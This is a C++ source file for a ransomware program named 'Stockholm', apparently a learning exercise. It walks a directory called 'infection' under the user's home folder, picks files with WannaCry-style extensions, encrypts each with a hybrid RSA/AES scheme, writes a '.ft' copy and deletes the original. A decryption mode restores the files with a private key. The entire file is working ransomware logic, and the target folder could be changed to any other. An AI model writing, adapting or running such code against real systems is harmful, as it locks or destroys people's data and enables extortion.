
#include <fstream>
#include <iostream>
#include <openssl/evp.h>
#include <openssl/err.h>
#include <cstring>
#include <unistd.h>
#include "log.hpp"
#include "rsa.hpp"
#include "sha.hpp"
#include "opts.hpp"
#include "crawler.hpp"
#include "stockholm.hpp"

namespace
{

	bool wncryExtensionsFilter(std::string path)
	{
		for (size_t i = 0; i < stockholm::extensions_count; ++i)
		{
			if (path.ends_with(stockholm::extensions[i]))
				return true;
		}
		return false;
	}

	fs::path getHomeDir()
	{
		char *envHome = std::getenv("HOME");
		std::string homedir = envHome ? envHome : "";
		if (homedir.empty())
		{
			std::string username;
			char *envUser = std::getenv("USER");
			if (!envUser)
			{
				long nameMax = sysconf(_SC_LOGIN_NAME_MAX);
				char *buf = new char[nameMax];
				if (getlogin_r(buf, nameMax))
				{
					Log("Failed to fetch username");
					delete[] buf;
					return std::string();
				}
				username = buf;
				delete[] buf;
			}
			else
				username = envUser;
			homedir = "/home/" + username;
		}
		return fs::path{homedir};
	}

	int lockFile(fs::path keyfile, fs::path file)
	{
		Log(std::string("Encrypting file ") + file.string());
		FILE *fp = fopen(file.c_str(), "rb");
		if (!fp)
		{
			Perror("fopen");
			return 0;
		}
		BIO *in = BIO_new(BIO_s_mem());
		if (!in)
		{
			LogOpenSSLError();
			return 0;
		}
		char buf[1024];
		size_t len;
		do
		{
			len = fread(buf, sizeof(char), 1024, fp);
			BIO_write(in, buf, len);
		} while (len > 0);
		if (ferror(fp))
		{
			Perror("fread");
			BIO_free(in);
			fclose(fp);
			return (0);
		}
		fclose(fp);
		BIO *out = BIO_new_file(file.string().append(".ft").c_str(), "wb");
		if (!out)
		{
			LogOpenSSLError();
			BIO_free(in);
			return 0;
		}
		int ret = 1;
		if (!EncryptData_HybridRSA_AES(keyfile.c_str(), in, out))
		{
			Error(std::format("Failed to encrypt {}", file.string()));
			ret = 0;
		}
		else
		{
			Log(std::string("Decrypted file ") + file.string());

			if (unlink(file.c_str()) < 0)
			{
				Perror("unlink");
				ret = 0;
			}
		}
		BIO_free(in);
		BIO_free(out);
		return ret;
	}

	int decryptFile(fs::path keyfile, fs::path file, bool removeExtension)
	{
		Log(std::string("Decrypting file ") + file.string());
		BIO *in = BIO_new_file(file.c_str(), "rb");
		if (!in)
		{
			LogOpenSSLError();
			return 0;
		}
		if (removeExtension)
			file.replace_extension("");
		BIO *out = BIO_new_file(file.c_str(), "wb");
		if (!out)
		{
			LogOpenSSLError();
			BIO_free(in);
			return 0;
		}
		stockholm::header hdr;
		int ret = 1;
		if (!DecryptData_HybridRSA_AES(keyfile.c_str(), &hdr, in, out))
		{
			Error(std::format("Failed to decrypt {}", file.string()));
			ret = 0;
		}
		else
			Log(std::string("Decrypted file ") + file.string());
		BIO_free(in);
		BIO_free(out);
		return (ret);
	}

	int unlockFile(fs::path keyfile, fs::path file)
	{
		return decryptFile(keyfile, file, true);
	}

	int lockFilesInTarget(const fs::path &publicPEMFilePath)
	{
		const fs::path &target = stockholm::options.GetInfectionDir();
		fs::path publicKeyPath = target / stockholm::localPublicKeyFileName;
		fs::path encryptedPrivateKeyPath = target / stockholm::localPrivateKeyFileName;
		if (!CreateLocalRSAIdentity(publicPEMFilePath, publicKeyPath, encryptedPrivateKeyPath))
			return 0;

		Log(std::format("Searching for files in {}", target.string()));

		std::list<std::string> files = RetrieveFilesFrom(target);
		std::list<std::string> filteredFiles;
		std::copy_if(files.begin(), files.end(), std::back_inserter(filteredFiles), wncryExtensionsFilter);
		for (auto file : filteredFiles)
			lockFile(publicKeyPath, file);
		return (1);
	}

	bool dotFtFilesFilter(std::string path)
	{
		return path.ends_with(".ft");
	}

	int unlockFilesInTarget(const fs::path &privatePEMFilePath)
	{
		const fs::path &target = stockholm::options.GetInfectionDir();
		fs::path encryptedPrivateKeyPath = target / stockholm::localPrivateKeyFileName;
		decryptFile(privatePEMFilePath, encryptedPrivateKeyPath, false);
		std::list<std::string> files = RetrieveFilesFrom(target);
		std::list<std::string> filteredFiles;
		std::copy_if(files.begin(), files.end(), std::back_inserter(filteredFiles), dotFtFilesFilter);
		for (auto file : filteredFiles)
		{
			unlockFile(encryptedPrivateKeyPath, file);
		}
		return (1);
	}

	void version()
	{
		std::cout << "STOCKHOLM! v.1.0.0, made with love by ottomata" << std::endl;
		exit(0);
	}
}

int main(int argc, char **argv)
{
	stockholm::options = opts(argc, argv);
	if (stockholm::options.ShouldDisplayVersion())
		version();

	fs::path homeDir = getHomeDir();
	if (homeDir.empty())
	{
		Error("empty path for Home directory");
		return (1);
	}
	stockholm::options.SetInfectionDir(homeDir / "infection");
	int ret = 0;
	if (stockholm::options.IsInDecryptionMode())
		ret = unlockFilesInTarget(stockholm::options.GetKeyfilePath());
	else
		ret = lockFilesInTarget(fs::current_path() / "public.pem"); //! TODO: add introspection to retrieve the file
	if (!ret)
		Error("Failure");
	return (!ret);
}
